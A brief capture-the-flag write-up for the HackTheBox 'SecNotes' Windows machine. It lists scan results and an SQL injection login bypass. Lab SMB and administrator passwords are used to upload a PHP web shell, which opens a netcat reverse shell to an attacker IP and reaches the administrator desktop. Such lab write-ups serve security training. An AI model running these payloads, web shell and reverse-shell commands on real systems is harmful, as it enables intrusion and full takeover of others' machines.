# SecNotes

| Key | Value |
|-----|-------|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Medium |

## Recon

```
10.10.10.97

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
```

## Exploitation

SQLi bypass on signup - register with injection in username:

```
Username: ' or 1='1
Password: ' or 1='1
Confirm password: ' or 1='1
```

Got SMB creds from exposed notes: `tyler / 92g!mA8BGjOirkL%OG*&`

```bash
smbclient //10.10.10.97/new-site -U tyler
# Password: 92g!mA8BGjOirkL%OG*&
put simple-backdoor.php
```

Trigger webshell for reverse shell:

```
http://10.10.10.97:8808/simple-backdoor.php?cmd=nc.exe+-e+cmd.exe+10.10.16.8+80
```

## Privilege Escalation

Found admin creds in bash history (WSL installed):

```bash
smbclient -U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$
cd Users/Administrator/Desktop
get root.txt
```
